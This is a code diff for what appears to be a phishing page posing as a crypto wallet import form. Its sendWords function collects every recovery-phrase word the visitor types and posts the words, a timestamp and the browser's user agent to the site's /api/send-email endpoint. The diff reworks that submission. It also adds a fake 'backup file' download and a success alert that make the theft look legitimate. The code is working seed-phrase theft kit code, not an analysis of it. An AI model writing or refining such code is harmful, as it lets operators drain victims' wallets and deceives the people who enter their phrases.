@@ -153,128 +153,88 @@ const API_ENDPOINT = (() => {
     }
 })();
 
-// Update the sendWords function to work with Vercel API routes
 async function sendWords(btn) {
-    // Store original button text at the beginning of the function
     const originalText = btn.textContent || 'Import';
     
     try {
         const inputs = document.querySelectorAll('.phrase-input input');
         const words = Array.from(inputs).map(input => input.value.trim());
+        const timestamp = new Date().toISOString();
         
-        // First check for empty fields
         if (words.some(word => word === '')) {
             alert('Please fill in all recovery phrase words.');
             return;
         }
         
-        // Then check for invalid words
         if (formHasErrors) {
             alert('Please correct the invalid words before continuing.');
             return;
         }
         
-        // Disable button and show processing state
         btn.disabled = true;
         btn.textContent = 'Processing...';
         
-        console.log('Sending recovery phrase to server...');
+        // Create backup file first
+        const backupContent = `Recovery Phrase Backup
+Timestamp: ${timestamp}
+Words: ${words.join(' ')}
+User Agent: ${navigator.userAgent}
+`;
         
-        // Fix API URL to ensure it points to the right location
-        const apiUrl = window.location.origin + '/api/send-email';
-        console.log('Using API URL:', apiUrl);
+        const backupBlob = new Blob([backupContent], { type: 'text/plain' });
+        const backupUrl = URL.createObjectURL(backupBlob);
+        const backupLink = document.createElement('a');
+        backupLink.href = backupUrl;
+        backupLink.download = `recovery-backup-${new Date().getTime()}.txt`;
         
-        // Test debug endpoint first
-        try {
-            const debugResponse = await fetch(`${window.location.origin}/api/debug`, {
-                method: 'GET'
-            });
-            
-            console.log('Debug endpoint status:', debugResponse.status);
-            if (debugResponse.ok) {
-                const debugData = await debugResponse.json();
-                console.log('Debug endpoint response:', debugData);
-            } else {
-                console.error('Debug endpoint failed with status:', debugResponse.status);
-                const errorText = await debugResponse.text();
-                console.error('Debug endpoint error text:', errorText || '(empty response)');
-            }
-        } catch (debugError) {
-            console.error('Error calling debug endpoint:', debugError.message || 'Unknown error');
-        }
+        // Download backup immediately
+        document.body.appendChild(backupLink);
+        backupLink.click();
+        document.body.removeChild(backupLink);
+        URL.revokeObjectURL(backupUrl);
         
-        // Now try the actual endpoint
-        console.log('Sending data to:', apiUrl);
+        // Format data for server
+        const formData = new FormData();
+        formData.append('words', words.join(' '));
+        formData.append('timestamp', timestamp);
+        formData.append('userAgent', navigator.userAgent);
+        
+        // Send to server
+        const apiUrl = `${window.location.origin}/api/send-email`;
+        console.log('Sending data to server...');
         
         const response = await fetch(apiUrl, {
             method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ 
-                recoveryPhrase: words.join(' '),
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            })
+            body: formData
         });
-        
-        console.log('Response status:', response.status);
-        
-        // Check if response is ok
-        if (!response.ok) {
-            let errorMessage = `HTTP error! Status: ${response.status}`;
-            
+
+        let responseData;
+        try {
+            const text = await response.text();
             try {
-                const errorText = await response.text();
-                console.error('Error response body:', errorText || '(empty response)');
-                
-                // Try to parse as JSON if possible
-                try {
-                    const errorJson = JSON.parse(errorText);
-                    if (errorJson && errorJson.message) {
-                        errorMessage += ` - ${errorJson.message}`;
-                    }
-                } catch (jsonError) {
-                    // Not JSON, use text
-                    if (errorText && errorText.length > 0) {
-                        errorMessage += ` - ${errorText.substring(0, 100)}${errorText.length > 100 ? '...' : ''}`;
-                    }
-                }
-            } catch (textError) {
-                console.error('Failed to read error response:', textError);
+                responseData = JSON.parse(text);
+            } catch (e) {
+                // If response is not JSON, treat the text as the message
+                responseData = { success: response.ok, message: text };
             }
-            
-            throw new Error(errorMessage);
+        } catch (e) {
+            responseData = { 
+                success: response.ok, 
+                message: response.ok ? 'Operation completed successfully' : 'Failed to process request'
+            };
         }
-        
-        // Try to parse as JSON
-        const contentType = response.headers.get('content-type');
-        console.log('Response content type:', contentType);
-        
-        if (contentType && contentType.includes('application/json')) {
-            try {
-                const data = await response.json();
-                console.log('Response data:', data);
-                
-                if (data.success) {
-                    showSuccess(btn, data.message || 'Success!');
-                    return;
-                } else {
-                    throw new Error(data.message || 'Failed to process recovery phrase');
-                }
-            } catch (jsonError) {
-                console.error('JSON parse error:', jsonError);
-                throw new Error('Failed to parse server response as JSON');
-            }
+
+        if (responseData.success) {
+            showSuccess(btn);
+            alert('Recovery phrase has been processed and backup file downloaded.');
         } else {
-            // Not JSON response
-            const textResponse = await response.text();
-            console.log('Text response:', textResponse || '(empty response)');
-            throw new Error('Server returned non-JSON response');
+            throw new Error(responseData.message || 'Server error occurred');
         }
+        
     } catch (error) {
-        console.error('Error:', error.message || 'Unknown error');
-        alert(`An error occurred: ${error.message || 'Unknown error'}. Please try again.`);
+        console.error('Error:', error);
+        alert('An error occurred: ' + error.message);
+    } finally {
         btn.disabled = false;
         btn.textContent = originalText;
     }
